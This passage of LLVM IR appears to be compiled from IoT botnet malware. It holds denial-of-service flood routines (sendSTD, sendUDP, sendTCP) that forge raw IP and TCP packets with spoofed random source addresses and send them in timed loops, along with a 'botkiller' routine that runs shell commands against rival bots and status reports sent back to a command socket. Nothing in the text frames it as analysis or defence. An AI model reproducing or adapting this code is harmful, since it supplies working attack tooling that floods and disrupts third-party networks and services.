  %.0 = phi i32 [ 0, %3 ], [ %43, %42 ]
  %28 = call i32 @rand() #3
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %27
  %31 = sext i32 %28 to i64
  %32 = urem i64 %31, 36
  %33 = getelementptr inbounds [36 x i8*], [36 x i8*]* @sendSTD.randstrings, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @send(i32 %5, i8* %34, i64 65, i32 0) #3
  %36 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %24, i32 16) #3
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %26
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %30
  %41 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #17
  unreachable

; <label>:42:                                     ; preds = %30, %27
  %.1 = phi i32 [ %.0, %27 ], [ 0, %30 ]
  %43 = add i32 %.1, 1
  br label %27
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #18
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %71

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #3
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %37, i32 %4)
  %40 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %41 = add nsw i32 %40, %2
  %42 = sext i32 %4 to i64
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer.us.preheader, label %.outer.preheader

.outer.preheader:                                 ; preds = %39
  br label %.outer

.outer.us.preheader:                              ; preds = %39
  br label %.outer.us

.outer.us:                                        ; preds = %.outer.us.backedge, %.outer.us.preheader
  %.068.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %.068.ph.us.be, %.outer.us.backedge ]
  %.067.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %57, %.outer.us.backedge ]
  br label %49

; <label>:45:                                     ; preds = %.us-lcssa.us.us
  %46 = add i32 %.068.ph.us, 1
  br label %.outer.us.backedge

; <label>:47:                                     ; preds = %.us-lcssa.us.us
  %48 = call i32 @usleep(i32 %44) #3
  br label %.outer.us.backedge

.outer.us.backedge:                               ; preds = %47, %45
  %.068.ph.us.be = phi i32 [ %46, %45 ], [ 0, %47 ]
  br label %.outer.us

; <label>:49:                                     ; preds = %.outer.us, %52
  %.067.us.us = phi i32 [ 0, %52 ], [ %.067.ph.us, %.outer.us ]
  %50 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %51 = icmp eq i32 %.067.us.us, %5
  br i1 %51, label %52, label %.us-lcssa.us.us

; <label>:52:                                     ; preds = %49
  %53 = call i32 @rand_cmwc()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %20, align 2
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %56 = icmp sgt i32 %55, %41
  br i1 %56, label %.loopexit.loopexit, label %49

.us-lcssa.us.us:                                  ; preds = %49
  %57 = add i32 %.067.us.us, 1
  %58 = icmp eq i32 %.068.ph.us, %6
  br i1 %58, label %47, label %45

.outer:                                           ; preds = %.outer.backedge, %.outer.preheader
  %.068.ph = phi i32 [ 0, %.outer.preheader ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %.outer.preheader ], [ %65, %.outer.backedge ]
  br label %59

; <label>:59:                                     ; preds = %.outer, %62
  %.067 = phi i32 [ 0, %62 ], [ %.067.ph, %.outer ]
  %60 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %61 = icmp eq i32 %.067, %5
  br i1 %61, label %62, label %.us-lcssa

; <label>:62:                                     ; preds = %59
  %63 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %64 = icmp sgt i32 %63, %41
  br i1 %64, label %.loopexit.loopexit104, label %59

.us-lcssa:                                        ; preds = %59
  %65 = add i32 %.067, 1
  %66 = icmp eq i32 %.068.ph, %6
  br i1 %66, label %67, label %69

; <label>:67:                                     ; preds = %.us-lcssa
  %68 = call i32 @usleep(i32 %44) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %67, %69
  %.068.ph.be = phi i32 [ %70, %69 ], [ 0, %67 ]
  br label %.outer

; <label>:69:                                     ; preds = %.us-lcssa
  %70 = add i32 %.068.ph, 1
  br label %.outer.backedge

; <label>:71:                                     ; preds = %24
  %72 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  %75 = load i32, i32* @mainCommSock, align 4
  %76 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %75, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i64 0, i64 0))
  br label %.loopexit

; <label>:77:                                     ; preds = %71
  store i32 1, i32* %10, align 4
  %78 = bitcast i32* %10 to i8*
  %79 = call i32 @setsockopt(i32 %72, i32 0, i32 3, i8* nonnull %78, i32 4) #3
  %80 = icmp slt i32 %79, 0
  br i1 %80, label %81, label %.preheader.preheader

.preheader.preheader:                             ; preds = %77
  br label %.preheader

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = call i32 (i32, i8*, ...) @sockprintf(i32 %82, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06985 = phi i32 [ %84, %.preheader ], [ 50, %.preheader.preheader ]
  %84 = add nsw i32 %.06985, -1
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %86 = call i32 @rand_cmwc()
  %87 = xor i32 %86, %85
  call void @srand(i32 %87) #3
  %88 = call i32 @rand() #3
  call void @init_rand(i32 %88)
  %89 = icmp eq i32 %84, 0
  br i1 %89, label %90, label %.preheader

; <label>:90:                                     ; preds = %.preheader
  %91 = icmp eq i32 %3, 0
  %92 = sub nsw i32 32, %3
  %93 = shl i32 -1, %92
  %.070 = select i1 %91, i32 0, i32 %93
  %94 = sext i32 %4 to i64
  %95 = add nsw i64 %94, 28
  %96 = call i8* @llvm.stacksave()
  %97 = alloca i8, i64 %95, align 16
  %98 = bitcast i8* %97 to %struct.iphdr*
  %99 = getelementptr i8, i8* %97, i64 20
  %100 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @GetRandomIP(i32 %.070)
  %103 = call i32 @htonl(i32 %102) #18
  %104 = add nsw i64 %94, 8
  %105 = trunc i64 %104 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %98, i32 %101, i32 %103, i8 zeroext 17, i32 %105)
  %106 = trunc i64 %104 to i16
  %107 = call zeroext i16 @htons(i16 zeroext %106) #18
  %108 = getelementptr inbounds i8, i8* %97, i64 24
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 8
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = bitcast i8* %99 to i16*
  store i16 %111, i16* %112, align 4
  br i1 %12, label %113, label %115

; <label>:113:                                    ; preds = %90
  %114 = call i32 @rand_cmwc()
  br label %119

; <label>:115:                                    ; preds = %90
  %116 = trunc i32 %1 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #18
  %118 = zext i16 %117 to i32
  br label %119

; <label>:119:                                    ; preds = %115, %113
  %.pre-phi = phi i16 [ %116, %115 ], [ 0, %113 ]
  %120 = phi i32 [ %118, %115 ], [ %114, %113 ]
  %121 = trunc i32 %120 to i16
  %122 = getelementptr inbounds i8, i8* %97, i64 22
  %123 = bitcast i8* %122 to i16*
  store i16 %121, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %97, i64 26
  %125 = bitcast i8* %124 to i16*
  store i16 0, i16* %125, align 2
  %126 = getelementptr inbounds i8, i8* %97, i64 28
  call void @makeRandomStr(i8* %126, i32 %4)
  %127 = bitcast i8* %97 to i16*
  %128 = getelementptr inbounds i8, i8* %97, i64 2
  %129 = bitcast i8* %128 to i16*
  %130 = load i16, i16* %129, align 2
  %131 = zext i16 %130 to i32
  %132 = call zeroext i16 @csum(i16* nonnull %127, i32 %131)
  %133 = getelementptr inbounds i8, i8* %97, i64 10
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %135 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %136 = add nsw i32 %135, %2
  %137 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %138 = getelementptr inbounds i8, i8* %97, i64 4
  %139 = bitcast i8* %138 to i16*
  %140 = getelementptr inbounds i8, i8* %97, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer71.us.preheader, label %.outer71.preheader

.outer71.preheader:                               ; preds = %119
  br label %.outer71

.outer71.us.preheader:                            ; preds = %119
  br label %.outer71.us

.outer71.us:                                      ; preds = %.outer71.us.backedge, %.outer71.us.preheader
  %.066.ph.us = phi i32 [ 0, %.outer71.us.preheader ], [ %164, %.outer71.us.backedge ]
  %.0.ph.us = phi i32 [ 0, %.outer71.us.preheader ], [ %.0.ph.us.be, %.outer71.us.backedge ]
  br label %147

; <label>:143:                                    ; preds = %.us-lcssa78.us.us
  %144 = add i32 %.0.ph.us, 1
  br label %.outer71.us.backedge

; <label>:145:                                    ; preds = %.us-lcssa78.us.us
  %146 = call i32 @usleep(i32 %142) #3
  br label %.outer71.us.backedge

.outer71.us.backedge:                             ; preds = %145, %143
  %.0.ph.us.be = phi i32 [ 0, %145 ], [ %144, %143 ]
  br label %.outer71.us

; <label>:147:                                    ; preds = %.outer71.us, %161
  %.066.us.us = phi i32 [ 0, %161 ], [ %.066.ph.us, %.outer71.us ]
  %148 = call i64 @sendto(i32 %72, i8* nonnull %97, i64 %95, i32 0, %struct.sockaddr* nonnull %137, i32 16) #3
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %112, align 4
  %151 = call i32 @rand_cmwc()
  %152 = trunc i32 %151 to i16
  store i16 %152, i16* %123, align 2
  %153 = call i32 @rand_cmwc()
  %154 = trunc i32 %153 to i16
  store i16 %154, i16* %139, align 4
  %155 = call i32 @GetRandomIP(i32 %.070)
  %156 = call i32 @htonl(i32 %155) #18
  store i32 %156, i32* %141, align 4
  %157 = load i16, i16* %129, align 2
  %158 = zext i16 %157 to i32
  %159 = call zeroext i16 @csum(i16* nonnull %127, i32 %158)
  store i16 %159, i16* %134, align 2
  %160 = icmp eq i32 %.066.us.us, %5
  br i1 %160, label %161, label %.us-lcssa78.us.us

; <label>:161:                                    ; preds = %147
  %162 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %163 = icmp sgt i32 %162, %136
  br i1 %163, label %.us-lcssa79.us.loopexit, label %147

.us-lcssa78.us.us:                                ; preds = %147
  %164 = add i32 %.066.us.us, 1
  %165 = icmp eq i32 %.0.ph.us, %6
  br i1 %165, label %145, label %143

.outer71:                                         ; preds = %.outer71.backedge, %.outer71.preheader
  %.066.ph = phi i32 [ 0, %.outer71.preheader ], [ %182, %.outer71.backedge ]
  %.0.ph = phi i32 [ 0, %.outer71.preheader ], [ %.0.ph.be, %.outer71.backedge ]
  br label %166

; <label>:166:                                    ; preds = %.outer71, %179
  %.066 = phi i32 [ 0, %179 ], [ %.066.ph, %.outer71 ]
  %167 = call i64 @sendto(i32 %72, i8* nonnull %97, i64 %95, i32 0, %struct.sockaddr* nonnull %137, i32 16) #3
  %168 = call i32 @rand_cmwc()
  %169 = trunc i32 %168 to i16
  store i16 %169, i16* %112, align 4
  %170 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #18
  store i16 %170, i16* %123, align 2
  %171 = call i32 @rand_cmwc()
  %172 = trunc i32 %171 to i16
  store i16 %172, i16* %139, align 4
  %173 = call i32 @GetRandomIP(i32 %.070)
  %174 = call i32 @htonl(i32 %173) #18
  store i32 %174, i32* %141, align 4
  %175 = load i16, i16* %129, align 2
  %176 = zext i16 %175 to i32
  %177 = call zeroext i16 @csum(i16* nonnull %127, i32 %176)
  store i16 %177, i16* %134, align 2
  %178 = icmp eq i32 %.066, %5
  br i1 %178, label %179, label %.us-lcssa78

; <label>:179:                                    ; preds = %166
  %180 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %181 = icmp sgt i32 %180, %136
  br i1 %181, label %.us-lcssa79.us.loopexit105, label %166

.us-lcssa78:                                      ; preds = %166
  %182 = add i32 %.066, 1
  %183 = icmp eq i32 %.0.ph, %6
  br i1 %183, label %184, label %186

; <label>:184:                                    ; preds = %.us-lcssa78
  %185 = call i32 @usleep(i32 %142) #3
  br label %.outer71.backedge

.outer71.backedge:                                ; preds = %184, %186
  %.0.ph.be = phi i32 [ 0, %184 ], [ %187, %186 ]
  br label %.outer71

; <label>:186:                                    ; preds = %.us-lcssa78
  %187 = add i32 %.0.ph, 1
  br label %.outer71.backedge

.us-lcssa79.us.loopexit:                          ; preds = %161
  br label %.us-lcssa79.us

.us-lcssa79.us.loopexit105:                       ; preds = %179
  br label %.us-lcssa79.us

.us-lcssa79.us:                                   ; preds = %.us-lcssa79.us.loopexit105, %.us-lcssa79.us.loopexit
  call void @llvm.stackrestore(i8* %96)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %52
  br label %.loopexit

.loopexit.loopexit104:                            ; preds = %62
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit104, %.loopexit.loopexit, %19, %34, %.us-lcssa79.us, %81, %74, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GetRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.182, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.185, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.186, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.187, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.188, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.189, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @GetRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #18
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @botkiller() local_unnamed_addr #12 {
  %1 = alloca [80 x i8], align 16
  %2 = getelementptr inbounds [80 x i8], [80 x i8]* %1, i64 0, i64 0
  br label %3

; <label>:3:                                      ; preds = %13, %0
  br label %4

; <label>:4:                                      ; preds = %4, %3
  %indvars.iv = phi i64 [ 0, %3 ], [ %indvars.iv.next, %4 ]
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.190, i64 0, i64 0), i64 10, i32 1, i1 false)
  %5 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %indvars.iv
  %6 = load i8*, i8** %5, align 8
  %7 = call i8* @strcat(i8* nonnull %2, i8* %6) #3
  %8 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i64 0, i64 0), i64 11, i32 1, i1 false)
  %9 = load i8*, i8** %5, align 8
  %10 = call i8* @strcat(i8* nonnull %2, i8* %9) #3
  %strlen = call i64 @strlen(i8* nonnull %2)
  %endptr = getelementptr [80 x i8], [80 x i8]* %1, i64 0, i64 %strlen
  %11 = bitcast i8* %endptr to i16*
  store i16 34, i16* %11, align 1
  %12 = call i32 @system(i8* nonnull %2) #3
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 9
  br i1 %exitcond, label %13, label %4

; <label>:13:                                     ; preds = %4
  %14 = call i32 @sleep(i32 5) #3
  br label %3
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

